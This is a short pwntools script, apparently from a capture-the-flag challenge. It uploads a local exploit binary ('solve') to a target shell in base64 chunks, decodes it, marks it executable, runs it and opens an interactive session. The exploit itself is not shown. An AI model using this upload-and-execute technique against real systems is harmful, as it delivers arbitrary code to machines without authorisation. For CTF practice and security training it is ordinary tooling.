#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from base64 import b64encode
import re

io = process("./run.sh", timeout = 300)
#  io = remote("10.249.233.189", 10006, timeout = 300)

leaked = io.recvuntil("/bin/sh: can't access tty; job control turned off")

with open("./solve") as f:
    binary = f.read()
    binary = b64encode(binary)

size = 0x200
i = 0
#  print len(binary)
while i < len(binary):
    b = binary[i:i + size]
    cmd = 'echo -n {} >> solve.b64;'.format(b)
    io.sendlineafter("/ # ", cmd)
    #  print i
    i += size

io.sendlineafter("/ # ", "base64 -d ./solve.b64 > solve")
io.sendlineafter("/ # ", "chmod +x ./solve")

success("done.")
#  io.sendlineafter("/ # ", "ls -lha")
io.sendlineafter("/ # ", "./solve")

io.interactive()
